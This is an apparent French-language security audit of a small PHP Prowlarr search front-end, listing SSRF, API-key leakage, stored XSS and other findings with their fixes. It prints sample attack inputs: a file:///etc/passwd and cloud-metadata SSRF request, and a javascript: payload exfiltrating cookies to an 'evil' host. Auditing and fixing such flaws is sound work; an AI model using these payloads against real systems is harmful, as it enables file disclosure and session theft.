# Audit de sécurité — indexOF_Prowlarr

Audit réalisé sur le code à l'état du commit `a7088a5`. Méthodologie : revue de code statique (OWASP Top 10), analyse des flux de données contrôlés par l'utilisateur, et modélisation de menaces sur le proxy de téléchargement.

Légende sévérité : 🔴 Critique · 🟠 Élevée · 🟡 Moyenne · 🔵 Faible / durcissement.

---

## Synthèse

| # | Vulnérabilité | Fichier | Sévérité | Statut |
|---|---------------|---------|----------|--------|
| V1 | SSRF / Open proxy / Lecture de fichiers locaux | `download_torrent.php` | 🔴 Critique | Corrigé |
| V2 | Fuite de la clé API Prowlarr (URL/logs/Referer) | `index.php` | 🟠 Élevée | Corrigé |
| V3 | XSS stocké via les liens des indexeurs (`infoUrl`) | `index.php` | 🟠 Élevée | Corrigé |
| V4 | Absence de timeouts / gestion d'erreur réseau (DoS) | `index.php`, `download_torrent.php` | 🟡 Moyenne | Corrigé |
| V5 | Paramètres de tri/ordre non validés | `index.php` | 🟡 Moyenne | Corrigé |
| V6 | Exposition possible du fichier `.env` | racine web | 🟡 Moyenne | Corrigé |
| V7 | Absence d'en-têtes de sécurité (CSP, etc.) | `index.php` | 🔵 Faible | Corrigé |
| V8 | Filtrage par indexeur cassé (noms au lieu d'IDs) | `index.php` | 🔵 Bug | Corrigé |

---

## V1 — 🔴 SSRF / Open proxy / Lecture de fichiers locaux

**Code vulnérable** (`download_torrent.php`) :

```php
$torrentUrl = $_GET['url'];
$torrentFile = file_get_contents($torrentUrl);  // aucune validation
echo $torrentFile;                                // contenu renvoyé tel quel
```

**Impact.** `file_get_contents()` accepte n'importe quel wrapper PHP. Un attaquant non authentifié peut :

- **Lire des fichiers locaux** : `download_torrent.php?url=file:///etc/passwd` → contenu renvoyé dans la réponse.
- **Atteindre des services internes** (SSRF) : `http://127.0.0.1:9696/...`, bases de données, panels d'admin.
- **Voler les credentials cloud** : `http://169.254.169.254/latest/meta-data/` (métadonnées AWS/GCP).
- **Utiliser le serveur comme proxy anonyme** pour attaquer des tiers depuis votre IP.

C'est la vulnérabilité la plus grave : exécutable sans authentification et avec réflexion de la réponse.

**Correctif appliqué.** Le proxy ne fait plus confiance à l'URL fournie par le client :

1. **Signature HMAC** — l'URL est signée (`hash_hmac` + `APP_SECRET`) au moment du rendu de la page ; le proxy refuse toute URL non signée par l'application. Seules les URLs réellement issues de Prowlarr sont téléchargeables.
2. **Liste blanche de protocoles** — uniquement `http`/`https` (`CURLOPT_PROTOCOLS` + `CURLOPT_REDIR_PROTOCOLS`), ce qui neutralise `file://`, `gopher://`, `dict://`, etc.
3. **Blocage des IP privées/réservées** — résolution DNS préalable et rejet des plages loopback, privées, link-local (anti-métadonnées cloud).
4. **Plafond de taille et timeouts** — coupe le transfert au-delà de 25 Mo, timeout strict (anti-DoS).
5. **Épinglage d'IP (`CURLOPT_RESOLVE`)** — l'hôte est résolu une seule fois, l'IP est validée puis la connexion est épinglée sur cette IP. cURL ne re-résout jamais → le **DNS rebinding** (TOCTOU entre la vérification et la connexion) est neutralisé.
6. **Suivi manuel des redirections** — `CURLOPT_FOLLOWLOCATION` est désactivé ; chaque saut 3xx est re-parsé et re-validé (schéma + IP publique + ré-épinglage), jusqu'à 3 sauts. Une redirection d'un hôte public vers une IP interne est rejetée.

**Vérification.** Testé de bout en bout : redirection publique → `169.254.169.254` / `127.0.0.1` rejetée (403), redirection → `file://` rejetée (400), redirection publique légitime suivie (200).

---

## V2 — 🟠 Fuite de la clé API Prowlarr

**Code vulnérable** (`index.php`) :

```php
$url = $baseUrl . '/api/v1/search?query=...&apikey=' . $apiKey . '&maxage=' . $days;
$response = file_get_contents($url);
```

**Impact.** La clé API circule **dans la query string**. Elle se retrouve donc dans : les logs d'accès du reverse-proxy/serveur, l'historique du navigateur, l'en-tête `Referer` envoyé aux liens externes, et tout cache intermédiaire. Quiconque obtient la clé contrôle l'instance Prowlarr.

Incohérence notable : `getTrackers()` utilisait déjà l'en-tête `X-Api-Key` (correct), mais pas `searchProwlarr()`.

**Correctif appliqué.** Toutes les requêtes passent par `ProwlarrClient`, qui envoie systématiquement la clé via l'en-tête HTTP `X-Api-Key` et ne la met jamais dans l'URL.

---

## V3 — 🟠 XSS stocké via les liens d'indexeurs

**Code vulnérable** (`index.php`) :

```php
<a href="<?php echo htmlspecialchars($result['infoUrl']); ?>" ...>
```

**Impact.** `htmlspecialchars` empêche de casser l'attribut, mais **ne valide pas le schéma**. Un indexeur malveillant ou compromis peut renvoyer `infoUrl` = `javascript:fetch('//evil/?c='+document.cookie)`. Au clic, exécution de JS dans le contexte de l'application (vol de session, actions arbitraires).

**Correctif appliqué.** `safe_url()` valide le schéma (`http`/`https`/`magnet` selon le contexte) avant tout rendu ; toute URL non conforme est neutralisée. Échappement explicite via `e()` (`ENT_QUOTES`).

---

## V4 — 🟡 Absence de timeouts et de gestion d'erreur (DoS)

**Impact.** `file_get_contents()` sans timeout bloque le worker PHP indéfiniment si Prowlarr ou un tracker ne répond pas → épuisement des workers (déni de service). En cas d'échec, `json_decode(false)` produit `null` puis `usort(null)` lève un warning.

**Correctif appliqué.** cURL avec `CONNECTTIMEOUT` et `TIMEOUT` explicites, gestion des erreurs (codes HTTP, JSON invalide) remontée proprement à l'utilisateur, et résultats toujours typés en tableau.

---

## V5 — 🟡 Paramètres de tri/ordre non validés

**Code vulnérable** : `$tri = $_GET['tri']` utilisé directement comme clé de tri ; `$ordre` non contrôlé.

**Impact.** Surface d'injection logique faible mais réelle (tri sur des clés arbitraires, comportement imprévisible). Mauvaise hygiène d'entrée.

**Correctif appliqué.** Liste blanche stricte : `tri ∈ {title, size, seeders, publishDate}`, `ordre ∈ {asc, desc}`, `days` borné numériquement.

---

## V6 — 🟡 Exposition possible du fichier `.env`

**Impact.** `index.php`, le code source et le `.env` étaient servis depuis la racine web. Une mauvaise config (ou le téléchargement direct de `.env`) expose la clé API.

**Correctif appliqué.** Réorganisation : seul `public/` est exposé (DocumentRoot). `src/`, `config.php` et `.env` sont **hors racine web**. La configuration est lue en priorité depuis les variables d'environnement (Docker).

---

## V7 — 🔵 En-têtes de sécurité absents

**Correctif appliqué.** Ajout de `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `X-Frame-Options: DENY`.

---

## V8 — 🔵 Filtrage par indexeur cassé

**Impact (bug fonctionnel).** Le code envoyait les **noms** des trackers dans un paramètre `indexers`, alors que l'API Prowlarr attend des **IDs numériques** via `indexerIds`. Le filtrage par tracker ne fonctionnait pas.

**Correctif appliqué.** `ProwlarrClient::indexers()` conserve le couple `id`/`name` ; le filtrage envoie `indexerIds[]=<id>`.

---

## Recommandations complémentaires (hors périmètre du correctif)

- **Authentification** : l'application n'a aucune authentification ; à placer derrière un reverse-proxy authentifié (Authelia, basic auth) ou un VPN.
- **Rate limiting** sur la recherche et le proxy de téléchargement.
- **HTTPS obligatoire** + en-tête `Strict-Transport-Security` en production.
- **Rotation** de la clé API Prowlarr (celle d'exemple a fuité dans le dépôt git — la régénérer).
